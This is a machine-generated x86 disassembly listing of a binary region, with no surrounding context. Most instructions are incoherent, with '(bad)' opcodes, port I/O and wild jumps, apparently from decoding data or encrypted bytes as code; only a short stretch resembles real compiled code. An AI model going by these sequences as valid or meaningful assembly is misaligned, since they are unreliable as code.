  41c8a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8a9:	in     eax,dx
  41c8aa:	shl    BYTE PTR [edx],cl
  41c8ac:	add    DWORD PTR [edx-0x502ec565],ecx
  41c8b2:	in     al,0xaa
  41c8b4:	mov    eax,0x55c5cffc
  41c8b9:	xchg   ecx,eax
  41c8ba:	mov    dh,0x16
  41c8bc:	adc    bl,BYTE PTR [edi-0xc]
  41c8bf:	fwait
  41c8c0:	and    edx,DWORD PTR [edi+0x4]
  41c8c3:	pushf  
  41c8c4:	ret    
  41c8c5:	mov    WORD PTR [edi+0x1c],fs
  41c8c8:	mov    dh,0xa0
  41c8ca:	or     bh,BYTE PTR [ebx+0xb8b4977]
  41c8d0:	test   DWORD PTR [esi+edi*1+0x638ec0ed],ecx
  41c8d7:	retf   0x2101
  41c8da:	push   ds
  41c8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8dc:	jge    0x41c959
  41c8de:	call   0x8fc2c55b
  41c8e3:	fld    QWORD PTR [esp+ecx*2+0x7f]
  41c8e7:	ss xor eax,0x1327e0ff
  41c8ed:	cli    
  41c8ee:	ds daa 
  41c8f0:	inc    edi
  41c8f1:	loopne 0x41c8a0
  41c8f3:	mov    esi,0x60ed135e
  41c8f8:	or     ebx,esp
  41c8fa:	mov    dh,0xf4
  41c8fc:	int    0xbe
  41c8fe:	pushf  
  41c8ff:	aaa    
  41c900:	icebp  
  41c901:	add    al,0x36
  41c903:	jns    0x41c8e2
  41c905:	add    dh,ch
  41c907:	ins    BYTE PTR es:[edi],dx
  41c908:	iret   
  41c909:	jbe    0x41c8ef
  41c90b:	repnz inc edi
  41c90d:	imul   ebx,DWORD PTR [esp+edx*4],0xffffffd7
  41c911:	out    dx,eax
  41c912:	xchg   ebx,eax
  41c913:	sub    bl,BYTE PTR [edi]
  41c915:	fcom   QWORD PTR [esi+0x35]
  41c918:	mov    bh,0x5e
  41c91a:	xor    esi,ebp
  41c91c:	jge    0x41c8f8
  41c91e:	inc    esp
  41c91f:	nop
  41c920:	ja     0x41c93d
  41c922:	jne    0x41c947
  41c924:	mov    ds:0xc9d5d61e,al
  41c929:	dec    eax
  41c92a:	or     al,0x99
  41c92c:	add    edx,edi
  41c92e:	add    al,0x49
  41c930:	loopne 0x41c8d8
  41c932:	jl     0x41c979
  41c934:	mov    cl,0xbe
  41c936:	dec    esi
  41c937:	add    dh,al
  41c939:	in     al,dx
  41c93a:	pop    esi
  41c93b:	into   
  41c93c:	sub    al,bl
  41c93e:	jg     0x41c952
  41c940:	mov    cl,0xa6
  41c942:	daa    
  41c943:	(bad)  
  41c944:	jbe    0x41c9bd
  41c946:	arpl   WORD PTR [ecx],ax
  41c948:	inc    esi
  41c949:	enter  0xdff,0xd4
  41c94d:	ja     0x41c9a6
  41c94f:	sbb    esp,DWORD PTR [edx-0x3cd8fa6d]
  41c955:	or     DWORD PTR [esi],ebp
  41c957:	fs in  al,dx
  41c959:	gs mov ah,0xed
  41c95c:	repnz add ah,BYTE PTR [edx-0x7c6df765]
  41c963:	stos   BYTE PTR es:[edi],al
  41c964:	xor    dh,BYTE PTR [eax-0x74]
  41c967:	push   esp
  41c968:	test   BYTE PTR [edx-0x6a3f359],0xc
  41c96f:	adc    bh,bl
  41c971:	stos   BYTE PTR es:[edi],al
  41c972:	or     al,0xf
  41c974:	leave  
  41c975:	mov    di,0x97a8
  41c979:	aaa    
  41c97a:	xchg   ebp,eax
  41c97b:	(bad)  
  41c97d:	das    
  41c97e:	sbb    eax,0xe4e3180b
  41c983:	(bad)  
  41c984:	(bad)  
  41c985:	mov    edx,0x12dd365f
  41c98a:	add    eax,0x4fa41669
  41c98f:	adc    al,0xbb
  41c991:	adc    DWORD PTR [ebx+0x7c12386],esp
  41c997:	std    
  41c998:	and    dh,BYTE PTR [ecx-0x5e]
  41c99b:	hlt    
  41c99c:	jmp    0xe5e2:0xb3c19005
  41c9a3:	mov    bl,0xf2
  41c9a5:	lods   al,BYTE PTR ds:[esi]
  41c9a6:	stc    
  41c9a7:	jmp    0x41c969
  41c9a9:	clc    
  41c9aa:	int3   
  41c9ab:	and    eax,0xdb077e26
  41c9b0:	adc    al,0xa
  41c9b2:	pop    es
  41c9b3:	sbb    bh,BYTE PTR [edx]
  41c9b5:	mov    ds:0x452a15a,al
  41c9ba:	sbb    DWORD PTR cs:[edi+0x4a2fda0b],ebx
  41c9c1:	dec    BYTE PTR [eax+0x7]
  41c9c4:	fwait
  41c9c5:	das    
  41c9c6:	stos   BYTE PTR es:[edi],al
  41c9c7:	cdq    
  41c9c8:	xor    dl,BYTE PTR [edi]
  41c9ca:	xor    eax,edx
  41c9cc:	xchg   ecx,eax
  41c9cd:	jb     0x41c9ba
  41c9cf:	repz xchg esi,eax
  41c9d1:	in     al,dx
  41c9d2:	fisttp WORD PTR [esi]
  41c9d4:	mov    edi,0x7bf8a8fe
  41c9d9:	jmp    0x936768ce
  41c9de:	jecxz  0x41c99a
  41c9e0:	push   ecx
  41c9e1:	stc    
  41c9e2:	jne    0x41c97e
  41c9e4:	in     eax,dx
  41c9e5:	xchg   BYTE PTR [edx-0x3edac133],ch
  41c9eb:	fist   DWORD PTR [esi-0x1fc636d3]
  41c9f1:	jge    0x41ca34
  41c9f3:	mov    gs,WORD PTR [esi]
  41c9f5:	push   0x14b51366
  41c9fa:	pop    edx
  41c9fb:	mov    BYTE PTR [edx-0x56],dl
  41c9fe:	cld    
  41c9ff:	sbb    BYTE PTR [edx-0x3901a5f8],0xd0
  41ca06:	test   al,0x20
  41ca08:	jp     0x41c98b
  41ca0a:	loop   0x41ca0c
  41ca0c:	fst    st(2)
  41ca0e:	sbb    ch,cl
  41ca10:	cmp    BYTE PTR [edi+0x7c],ah
  41ca13:	(bad)  
  41ca14:	sub    BYTE PTR [ecx+0x1207fdee],0xeb
  41ca1b:	or     eax,0x4cceb632
  41ca20:	jmpw   0xbac4
  41ca24:	mov    edx,0xd7101639
  41ca29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca2a:	mov    dh,0x41
  41ca2c:	sub    DWORD PTR [ebx],edi
  41ca2e:	imul   BYTE PTR [esi]
  41ca30:	adc    eax,0x82796c42
  41ca35:	loope  0x41c9d7
  41ca37:	xor    ah,BYTE PTR [ebp+0x1cebb303]
  41ca3d:	mov    DWORD PTR [edi-0x3d],esp
  41ca40:	inc    eax
  41ca41:	test   bh,0x18
  41ca44:	shr    BYTE PTR [ebp-0x2b],1
  41ca47:	push   DWORD PTR [edx+ebp*2-0x5229e09e]
  41ca4e:	(bad)  
  41ca4f:	cli    
  41ca50:	(bad)  
  41ca52:	clc    
  41ca53:	pop    esi
  41ca54:	mov    ecx,0xc62ba0d3
  41ca59:	mov    esp,0x106a7189
  41ca5e:	sub    eax,0x4a011506
  41ca63:	sbb    eax,0x62a09ca6
  41ca68:	(bad)  
  41ca69:	pop    ss
  41ca6a:	xchg   ebx,eax
  41ca6b:	aas    
  41ca6c:	aaa    
  41ca6d:	js     0x41ca90
  41ca6f:	sbb    BYTE PTR [ebp-0x6c],ah
  41ca72:	arpl   sp,sp
  41ca74:	jecxz  0x41ca84
  41ca76:	sbb    al,0xdf
  41ca78:	jmp    0x41ca99
  41ca7a:	cdq    
  41ca7b:	dec    ebx
  41ca7c:	lods   eax,DWORD PTR ds:[esi]
  41ca7d:	nop
  41ca7e:	jle    0x41caa5
  41ca80:	fistp  WORD PTR [edx]
  41ca82:	mov    ah,0x9
  41ca84:	jnp    0x41ca2e
  41ca86:	cmp    edi,esi
  41ca88:	int3   
  41ca89:	xor    eax,DWORD PTR [ebp+0x5d0a3245]
  41ca8f:	les    ebp,FWORD PTR [eax]
  41ca91:	ins    DWORD PTR es:[edi],dx
  41ca92:	cmc    
  41ca93:	gs pop es
  41ca95:	xor    al,BYTE PTR [edi]
  41ca97:	cmp    al,0xbf
  41ca99:	ret    0x2c6e
  41ca9c:	pop    edx
  41ca9d:	xor    al,0xad
  41ca9f:	add    esp,0x8a42672d
  41caa5:	xchg   DWORD PTR [esi+0x7a],edx
  41caa8:	mov    ds:0x5680679,eax
  41caad:	int3   
  41caae:	and    dl,dh
  41cab0:	and    edi,DWORD PTR [ebp+0x78]
  41cab3:	sub    DWORD PTR [edi],edi
  41cab5:	pop    edi
  41cab6:	ja     0x41ca4d
  41cab8:	adc    bl,bh
  41caba:	mov    bl,0x1f
  41cabc:	dec    eax
  41cabd:	lods   al,BYTE PTR ds:[esi]
  41cabe:	push   0xffffff83
  41cac0:	xchg   ebx,eax
  41cac1:	div    BYTE PTR [edx]
  41cac3:	rol    DWORD PTR [ebx],1
  41cac5:	mov    edi,ebx
  41cac7:	jp     0x41ca9f
  41cac9:	gs push ss
  41cacb:	out    dx,eax
  41cacc:	jne    0x41cb03
  41cace:	dec    esp
  41cacf:	dec    ebp
  41cad0:	push   ebx
  41cad1:	lds    eax,FWORD PTR [ecx]
  41cad3:	test   eax,0x996001a5
  41cad8:	aam    0x13
  41cada:	xchg   esi,eax
  41cadb:	or     eax,0x7d0cdf38
  41cae0:	int3   
  41cae1:	idiv   BYTE PTR [eax+0x3a023724]
  41cae7:	or     bl,ch
  41cae9:	call   0xaed3:0xf7dfa20e
  41caf0:	hlt    
  41caf1:	add    al,0xe5
  41caf3:	popa   
  41caf4:	je     0x41caac
  41caf6:	adc    bl,0x6d
  41caf9:	js     0x41cb3f
  41cafb:	ja     0x41caf8
  41cafd:	sbb    eax,DWORD PTR [ecx-0x207b93a5]
  41cb03:	sbb    cl,ah
  41cb05:	jb     0x41cb5f
  41cb07:	xor    BYTE PTR [ecx+0xf],bh
  41cb0a:	loope  0x41cb3e
  41cb0c:	jb     0x41cb66
  41cb0e:	mov    ds:0x56971ece,al
  41cb13:	sbb    eax,0x49b67448
  41cb18:	xchg   ecx,eax
  41cb19:	mov    ebp,0x9efd91f7
  41cb1e:	and    ch,bl
  41cb20:	pop    ds
  41cb21:	xor    bh,dh
  41cb23:	loopne 0x41caac
  41cb25:	inc    edx
  41cb26:	pop    edi
  41cb27:	push   ebx
  41cb28:	jecxz  0x41cb56
  41cb2a:	iret   
  41cb2b:	cwde   
  41cb2c:	push   edx
  41cb2d:	push   0x731011ec
  41cb32:	in     al,0xcb
  41cb34:	add    DWORD PTR [edx+edx*8+0x6c],ebp
  41cb38:	das    
  41cb39:	sar    DWORD PTR [esp+ebx*8-0x9672d69],1
  41cb40:	sub    ch,BYTE PTR [edx+0x1c]
  41cb43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb44:	push   ebx
  41cb45:	pop    ebp
  41cb46:	rol    BYTE PTR [edi+0x5e43f001],0xe1
  41cb4d:	shr    DWORD PTR [edi-0x41],0x18
  41cb51:	xor    ah,0x7b
  41cb54:	jae    0x41cb9f
  41cb56:	repz adc ebp,DWORD PTR [eax-0x3c]
  41cb5a:	pop    ss
  41cb5b:	xchg   esi,eax
  41cb5c:	dec    esi
  41cb5d:	adc    ecx,edx
  41cb5f:	mov    ecx,0x8ecd14ce
  41cb64:	push   0xa5d3b441
  41cb69:	bound  ecx,QWORD PTR [edx-0x5c]
  41cb6c:	mov    ebp,edi
  41cb6e:	and    al,0x33
  41cb70:	mul    DWORD PTR [ebp-0x22b505fa]
  41cb76:	cld    
  41cb77:	xor    bh,bh
  41cb79:	popa   
  41cb7a:	in     al,dx
  41cb7b:	lds    edi,FWORD PTR [ebx-0x59e0a470]
  41cb81:	or     DWORD PTR ds:0xfe396e24,0x13603381
  41cb8b:	jge    0x41cbac
  41cb8d:	xor    esi,0x1e
  41cb90:	inc    esi
  41cb91:	cmp    eax,0xf96b7104
  41cb96:	push   ecx
  41cb97:	and    al,0xbf
  41cb99:	dec    ecx
  41cb9a:	(bad)  
  41cb9b:	xchg   esp,eax
  41cb9c:	dec    eax
  41cb9d:	rcl    BYTE PTR [ebx-0x2f1b03],0xa2
  41cba4:	cmc    
  41cba5:	or     DWORD PTR [edi+0x3d],ebx
  41cba8:	retf   0xf11
  41cbab:	xor    ecx,DWORD PTR ds:0x27520c6b
  41cbb1:	sub    BYTE PTR ds:0xeb528aa7,dh
  41cbb7:	jns    0x41cbb6
  41cbb9:	mov    ebp,0xada0a9e1
  41cbbe:	fiadd  DWORD PTR [esi-0x1b0fcbc1]
  41cbc4:	xchg   ebp,eax
  41cbc5:	sbb    dl,bl
  41cbc7:	adc    edi,DWORD PTR [ebx+0x13]
  41cbca:	xor    eax,DWORD PTR [edi-0x47]
  41cbcd:	push   edx
  41cbce:	sar    esp,cl
  41cbd0:	cdq    
  41cbd1:	push   esi
  41cbd2:	add    edx,ecx
  41cbd4:	imul   edx,edi
  41cbd7:	sub    ebx,DWORD PTR ds:0x42a301
  41cbdd:	mov    edi,DWORD PTR [ebp-0x8]
  41cbe0:	mov    ebx,DWORD PTR [ebp-0x10]
  41cbe3:	or     DWORD PTR ds:0x42a401,0x42a385
  41cbed:	sub    ebx,edi
  41cbef:	mov    DWORD PTR ds:0x42a339,0xb6b
  41cbf9:	jmp    0x41d10b
  41cbfe:	aas    
  41cbff:	int3   
  41cc00:	ret    0xd1d7
  41cc03:	aad    0xd9
  41cc05:	aam    0x8c
  41cc07:	stc    
  41cc08:	stos   BYTE PTR es:[edi],al
  41cc09:	push   0xffffffe7
  41cc0b:	mov    ah,BYTE PTR [ebx+0x7fa094ec]
  41cc11:	js     0x41cc86
  41cc13:	jl     0x41cc8d
  41cc15:	js     0x41cc7d
  41cc17:	jae    0x41cbc2
  41cc19:	xchg   edx,eax
  41cc1a:	shl    DWORD PTR [edi-0x19],1
  41cc1d:	fs mov ch,0x69
  41cc20:	dec    edi
  41cc21:	outs   dx,BYTE PTR ds:[esi]
  41cc22:	adc    esi,esp
  41cc24:	enter  0x30be,0x39
  41cc28:	push   edx
  41cc29:	(bad)  
  41cc2a:	in     al,0xdf
  41cc2c:	cs cmp eax,0x1db3bc0e
  41cc32:	mov    ebp,0xf653cef6
  41cc37:	(bad)  
  41cc39:	mov    ds:0xac62a178,al
  41cc3e:	cmp    eax,0x5df35b98
  41cc43:	mov    bh,0x76
  41cc45:	call   0xb5e:0x50bddc5d
  41cc4c:	retf   0xe967
  41cc4f:	mov    ecx,DWORD PTR [ebp+0x2554ff38]
  41cc55:	sbb    eax,0xc33323b1
  41cc5a:	out    dx,eax
  41cc5b:	sub    al,0x95
  41cc5d:	mov    esi,0x9afa101a
  41cc62:	mov    eax,0x79579e17
  41cc67:	ret    0xfa90
  41cc6a:	push   ss
  41cc6b:	fist   DWORD PTR [ecx-0x29]
  41cc6e:	adc    al,BYTE PTR [eax+0xc7572a1]
  41cc74:	int    0xb1
  41cc76:	inc    ebp
  41cc77:	int    0xcf
  41cc79:	push   edi
  41cc7a:	ss js  0x41cc65
  41cc7d:	dec    eax
  41cc7f:	xor    al,0x52
  41cc81:	fwait
  41cc82:	pop    eax
  41cc83:	mov    al,0xb1
  41cc85:	add    eax,0xb5d86205
  41cc8a:	dec    esi
  41cc8b:	pop    ebp
  41cc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc8d:	jne    0x41cc9a
  41cc8f:	xor    BYTE PTR [ebx],cl
  41cc91:	xlat   BYTE PTR ds:[ebx]
  41cc92:	sbb    eax,0x177a4a61
  41cc97:	xor    edx,edi
  41cc99:	xchg   DWORD PTR ds:0x9de00642,edi
  41cc9f:	xor    al,0x54
  41cca1:	xchg   ebp,eax
  41cca2:	xchg   ebx,eax
  41cca3:	ficomp WORD PTR ds:[ebx+0x5a]
  41cca7:	sahf   
  41cca8:	ins    DWORD PTR es:[edi],dx
  41cca9:	mov    al,ds:0xc44ea9fe
  41ccae:	sti    
  41ccaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccb0:	pop    ecx
  41ccb1:	loope  0x41cc3c
  41ccb3:	mov    ah,0x8
  41ccb5:	jecxz  0x41cccb
  41ccb7:	inc    ebx
  41ccb8:	or     DWORD PTR [edx],edi
  41ccba:	aaa    
  41ccbb:	in     eax,0xf0
  41ccbd:	(bad)  
  41ccbe:	je     0x41ccd8
  41ccc0:	mov    ebx,0x3735170c
  41ccc5:	xchg   ebx,eax
  41ccc6:	pop    ss
  41ccc7:	lds    ebx,FWORD PTR [esi-0x78]
  41ccca:	xchg   edx,eax
  41cccb:	fucomip st,st(7)
  41cccd:	add    DWORD PTR [edi-0x6a9b127c],esp
  41ccd3:	cmp    BYTE PTR [ecx-0x50],ch
  41ccd6:	xor    BYTE PTR [edi+0x1f],0x43
  41ccda:	push   ds
  41ccdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccdc:	lock scas al,BYTE PTR es:[edi]
  41ccde:	xor    eax,0x80acfd
  41cce3:	sub    al,0xab
  41cce5:	cmc    
  41cce6:	in     al,0x5f
  41cce8:	cmp    edi,DWORD PTR [esi]
  41ccea:	scas   eax,DWORD PTR es:[edi]
  41cceb:	mov    al,ds:0xb640b882
  41ccf0:	sub    edi,DWORD PTR [eax-0xca15546]
  41ccf6:	popfw  
  41ccf8:	ins    BYTE PTR es:[edi],dx
  41ccf9:	mov    ds:0x5e2302b3,al
  41ccfe:	(bad)  
  41cd00:	rcl    DWORD PTR [edi+0x43],1
  41cd03:	push   ss
  41cd04:	ins    DWORD PTR es:[edi],dx
  41cd05:	xchg   esp,eax
  41cd06:	enter  0xfc22,0x15
  41cd0a:	mov    eax,ds:0x34f13661
  41cd0f:	jmp    0x80927ae0
  41cd14:	dec    esi
  41cd15:	mov    ecx,0x91d5b041
  41cd1a:	cmp    bl,cl
  41cd1c:	frndint 
  41cd1e:	pop    ebp
  41cd1f:	mov    esi,0x1f311691
  41cd24:	and    esi,DWORD PTR [edi+0x201079eb]
  41cd2a:	in     al,0x91
  41cd2c:	dec    ebp
  41cd2d:	inc    ecx
  41cd2e:	gs push 0x2452f35e
  41cd34:	stc    
  41cd35:	in     al,dx
  41cd36:	fild   QWORD PTR [ebp+0x28b605b9]
  41cd3c:	out    dx,al
  41cd3d:	fdiv   DWORD PTR [edi]
  41cd3f:	push   es
  41cd40:	and    BYTE PTR [ebp+0x1b],0x5b
  41cd44:	std    
  41cd45:	loop   0x41cd33
  41cd47:	adc    eax,0x43694d78
  41cd4c:	push   ebp
  41cd4d:	test   al,0xdf
  41cd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd50:	dec    ecx
  41cd51:	xchg   ebx,eax
  41cd52:	ins    BYTE PTR es:[edi],dx
  41cd53:	mov    DWORD PTR [edx+0x2a],esi
  41cd56:	mov    esp,0x303326f9
  41cd5b:	xchg   edi,eax
  41cd5c:	sti    
  41cd5d:	mov    bl,0xaf
  41cd5f:	mov    bl,0xd7
  41cd61:	out    dx,eax
  41cd62:	aad    0x41
  41cd64:	fs pop edx
  41cd66:	leave  
  41cd67:	xor    DWORD PTR [ecx],0x3e5f1481
  41cd6d:	lods   al,BYTE PTR ds:[esi]
  41cd6e:	mov    eax,0xfc324125
  41cd73:	fisttp QWORD PTR [ecx-0x19e9f297]
  41cd79:	test   al,0x57
  41cd7b:	pusha  
  41cd7c:	jl     0x41cd05
  41cd7e:	xor    eax,0xe50f5a71
  41cd83:	pop    edx
  41cd84:	xchg   ebx,eax
  41cd85:	mov    BYTE PTR [ebx+0x55b8923],bl
  41cd8b:	fstp   QWORD PTR [ecx-0x5b0e6152]
  41cd91:	hlt    
  41cd92:	dec    edi
  41cd93:	mov    ebx,eax
  41cd95:	popa   
  41cd96:	into   
  41cd97:	gs enter 0x3796,0x91
  41cd9c:	xchg   esp,eax
  41cd9d:	push   edi
  41cd9e:	iret   
  41cd9f:	xchg   edx,eax
  41cda0:	cli    
  41cda1:	mov    cx,WORD PTR [ecx+0x11]
  41cda5:	adc    BYTE PTR [edi],al
  41cda7:	scas   eax,DWORD PTR es:[edi]
  41cda8:	sub    eax,0x89ea2bec
  41cdad:	dec    ecx
  41cdae:	or     DWORD PTR [eax+0x4],edx
  41cdb1:	cli    
  41cdb2:	sbb    eax,0x324c2bb5
  41cdb7:	out    0x8c,eax
  41cdb9:	iret   
  41cdba:	mov    edx,0xf8501aee
  41cdbf:	fstp   TBYTE PTR [edi]
  41cdc1:	in     al,0x27
  41cdc3:	cmc    
  41cdc4:	push   esp
  41cdc5:	fistp  QWORD PTR [ebp-0x645d9a66]
  41cdcb:	aad    0xf
  41cdcd:	push   0x1cce0ce6
  41cdd2:	retf   0x480c
  41cdd5:	sbb    dl,BYTE PTR [ebp+0x24]
  41cdd8:	xlat   BYTE PTR ds:[ebx]
  41cdd9:	shr    eax,0xc4
  41cddc:	adc    esi,ebx
  41cdde:	repz add cl,dh
  41cde1:	jmp    0x81c9:0x4fbbf221
  41cde8:	aas    
  41cde9:	lods   eax,DWORD PTR ds:[esi]
  41cdea:	rol    DWORD PTR [ebx-0x30],1
  41cded:	in     eax,dx
  41cdee:	adc    BYTE PTR [edi+0x48],dh
  41cdf1:	push   cs
  41cdf2:	mov    ds:0x85d5eaa7,eax
  41cdf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdf8:	stos   DWORD PTR es:[edi],eax
  41cdf9:	push   ss
  41cdfa:	leave  
  41cdfb:	sar    BYTE PTR [ecx-0x14],0xd4
  41cdff:	addr16 dec eax
  41ce01:	xchg   dl,bh
  41ce03:	out    0x1b,al
  41ce05:	lock mov eax,0x4cb73363
  41ce0b:	stos   DWORD PTR es:[edi],eax
  41ce0c:	fs ret 
  41ce0e:	dec    ebx
  41ce0f:	xor    cl,BYTE PTR [esi-0xb0823fd]
  41ce15:	mov    esi,0xb1a58d1b
  41ce1a:	iret   
  41ce1b:	sub    BYTE PTR [eax+0x49],bl
  41ce1e:	adc    DWORD PTR [edi+eiz*1+0x2e],esi
  41ce22:	mov    ecx,0xe8d8bc70
  41ce27:	in     eax,0xb5
  41ce29:	lods   al,BYTE PTR ds:[esi]
  41ce2a:	in     eax,0x2e
  41ce2c:	push   ss
  41ce2d:	pop    es
  41ce2e:	pop    ds
  41ce2f:	push   ecx
  41ce30:	jnp    0x41ce2e
  41ce32:	pop    ebx
  41ce33:	das    
  41ce34:	inc    BYTE PTR [esi]
  41ce36:	in     eax,dx
  41ce37:	fnsave [ecx*2+0x6d423636]
  41ce3e:	imul   ebp,edx,0xfffffff4
  41ce41:	int3   
  41ce42:	fsubp  st(2),st
  41ce44:	xchg   ecx,eax
  41ce45:	fdivr  DWORD PTR [edi-0x9]
  41ce48:	push   cs
  41ce49:	cld    
  41ce4a:	rcl    WORD PTR [edi+0x95aa586],0x15
  41ce52:	mov    edi,fs
  41ce54:	fild   QWORD PTR [edi-0x32d3abfd]
  41ce5a:	jp     0x41ce3b
  41ce5c:	adc    DWORD PTR [edx-0x62],ebp
  41ce5f:	add    BYTE PTR [ebx+esi*2+0x3bdd2b15],dl
  41ce66:	std    
  41ce67:	mov    fs,WORD PTR [ecx-0xf]
  41ce6a:	push   ecx
  41ce6b:	lods   al,BYTE PTR ds:[esi]
  41ce6c:	out    dx,eax
  41ce6d:	adc    edx,edi
  41ce6f:	repz mov fs,eax
  41ce72:	nop
  41ce73:	xchg   ebx,eax
  41ce74:	in     al,dx
  41ce75:	xor    cl,bl
  41ce77:	shr    BYTE PTR [edx],1
  41ce79:	xor    al,0x87
  41ce7b:	jecxz  0x41ce32
  41ce7d:	repz inc ecx
  41ce7f:	inc    eax
  41ce80:	adc    ecx,DWORD PTR [edi-0x60205948]
  41ce86:	cmovs  eax,DWORD PTR [ecx-0x14bb7a57]
  41ce8d:	push   0x243f1186
  41ce92:	movq   mm1,QWORD PTR [ebp-0x48]
  41ce96:	std    
  41ce97:	pop    ebp
  41ce98:	sbb    esi,esi
  41ce9a:	jp     0x41ce7d
  41ce9c:	pop    ss
  41ce9d:	(bad)  
  41ce9e:	lahf   
  41ce9f:	push   ebx
  41cea1:	lea    eax,[edx-0x64ecee61]
  41cea7:	pop    ebx
  41cea8:	push   DWORD PTR [ecx]
  41ceaa:	sar    DWORD PTR [edx],0xbe
  41cead:	icebp  
  41ceae:	mov    BYTE PTR [ecx-0x33f48658],dl
  41ceb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ceb5:	xlat   BYTE PTR ds:[ebx]
  41ceb6:	xchg   ecx,eax
  41ceb7:	mov    dh,BYTE PTR [ebx+0x3e]
  41ceba:	mov    gs,WORD PTR [edi+0x26fd83b7]
  41cec0:	add    BYTE PTR [ebp+0x7e2b5319],dh
  41cec6:	jmp    0x41cf17
  41cec8:	push   ebx
  41cec9:	aad    0x26
  41cecb:	test   eax,0xdec17330
  41ced0:	pop    ecx
  41ced1:	fwait
  41ced2:	retf   
  41ced3:	out    0x91,al
  41ced5:	and    DWORD PTR [ebp+0x3d],edi
  41ced8:	inc    edx
  41ced9:	lods   al,BYTE PTR ds:[esi]
  41ceda:	aam    0x6f
  41cedc:	out    dx,al
  41cedd:	mov    ds:0x4cad4dea,eax
  41cee2:	in     al,0x68
  41cee4:	dec    esp
  41cee5:	ja     0x41cece
  41cee7:	add    BYTE PTR [edx-0x446daa53],cl
  41ceed:	in     al,dx
  41ceee:	mov    ch,BYTE PTR [eax-0x79c8fa34]
  41cef4:	inc    edi
  41cef5:	sar    DWORD PTR [ecx-0x6a6c953a],cl
  41cefb:	mov    bl,0xb
  41cefd:	fwait
  41cefe:	jno    0x41ce85
  41cf00:	enter  0xa998,0x6c
  41cf04:	mov    bl,0xa6
  41cf06:	mov    ah,0x12
  41cf08:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41cf0a:	out    0x47,eax
  41cf0c:	imul   edi,DWORD PTR [eax+0x9614ee5],0x2f
  41cf13:	sub    BYTE PTR [esi+ebp*8+0x2d],cl
  41cf17:	push   ebx
  41cf18:	xchg   edi,eax
  41cf19:	je     0x41cebf
  41cf1b:	dec    esi
  41cf1c:	imul   esi,DWORD PTR [edi+0x25],0x9fc1c23b
  41cf23:	mov    ecx,0x55e25d31
  41cf28:	ret    
  41cf29:	mov    edx,0xaed30f0f
  41cf2e:	aad    0x81
  41cf30:	fs int 0x72
  41cf33:	sbb    eax,0x7cf5dbb3
  41cf38:	popf   
  41cf39:	jp     0x41cec5
  41cf3b:	inc    ebp
  41cf3c:	(bad)  
  41cf3d:	adc    al,0x7b
  41cf3f:	fidiv  DWORD PTR [esi-0x5f]
  41cf42:	mov    bh,0x13
  41cf44:	and    eax,0xbb8dc324
  41cf49:	test   al,0xf0
  41cf4b:	fnstcw WORD PTR [edi+0x24222145]
  41cf51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf52:	xchg   edx,eax
  41cf53:	add    bl,BYTE PTR [edx]
  41cf55:	fidiv  DWORD PTR [ebp+0x51]
  41cf58:	int3   
  41cf59:	jp     0x41cf89
  41cf5b:	shr    DWORD PTR [ebp-0x2d1290a4],cl
  41cf61:	lahf   
  41cf62:	outs   dx,DWORD PTR ds:[esi]
  41cf63:	mul    bl
  41cf65:	retf   
  41cf66:	imul   ecx,DWORD PTR [edx+ebx*1+0x20],0xfc7e7364
  41cf6e:	jmp    0x41cf9f
  41cf70:	bound  esp,QWORD PTR [ecx+ebx*1]
  41cf73:	hlt    
  41cf74:	rcr    dh,0x6f
  41cf77:	call   0xb019:0x4602bc26
  41cf7e:	out    0x29,eax
  41cf80:	fdivr  DWORD PTR [esi-0x57]
  41cf83:	lods   eax,DWORD PTR ds:[esi]
  41cf84:	(bad)  
  41cf85:	push   ds
  41cf86:	mov    bh,0xf7
  41cf88:	rol    BYTE PTR [eax+0x5e],1
  41cf8b:	imul   esp,DWORD PTR [eax+0x69],0xc225a9ab
  41cf92:	(bad)  
  41cf93:	shr    BYTE PTR [ebp+0x6262dded],0x4c
  41cf9a:	stc    
  41cf9b:	pushf  
  41cf9c:	fldcw  WORD PTR [esi+0x6f]
  41cf9f:	mov    esi,0xa8a90863
  41cfa4:	hlt    
  41cfa5:	jp     0x41cf72
  41cfa7:	sub    eax,0xcfa553a2
  41cfac:	(bad)  
  41cfad:	xchg   esi,eax
  41cfae:	push   ecx
  41cfaf:	sbb    dh,BYTE PTR [esi]
  41cfb1:	call   0xa941:0x779ee292
  41cfb8:	test   DWORD PTR [edi-0x38],edx
  41cfbb:	test   DWORD PTR [esi],edi
  41cfbd:	push   ds
  41cfbe:	adc    eax,0xe3cf6011
  41cfc3:	and    BYTE PTR fs:[ecx-0x7a],dl
  41cfc7:	lods   al,BYTE PTR ds:[esi]
  41cfc8:	test   eax,0xc9e1acfc
  41cfcd:	push   cs
  41cfce:	fisub  DWORD PTR [ebx+eiz*8-0x9]
  41cfd2:	lahf   
  41cfd3:	fist   WORD PTR [ecx]
  41cfd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfd6:	clc    
  41cfd7:	shl    BYTE PTR [esi+0x65],0xc0
  41cfdb:	les    eax,FWORD PTR [ebp+0x61]
  41cfde:	ja     0x41cffd
  41cfe0:	(bad)  
  41cfe1:	xor    BYTE PTR [eax+0x2b42aba7],al
  41cfe7:	call   0xeb4a1664
  41cfec:	aas    
  41cfed:	push   eax
  41cfee:	outs   dx,BYTE PTR ds:[esi]
  41cfef:	xor    eax,0xa5ed2b12
  41cff4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41cff6:	and    al,0x59
  41cff8:	cld    
  41cff9:	lods   al,BYTE PTR ds:[esi]
  41cffa:	nop
  41cffb:	dec    ebx
  41cffc:	out    0x46,eax
  41cffe:	dec    edx
  41cfff:	add    esi,ebp
  41d001:	and    DWORD PTR [ecx],esi
  41d003:	shl    BYTE PTR [esi+0x3a],1
  41d006:	fisub  WORD PTR [eax]
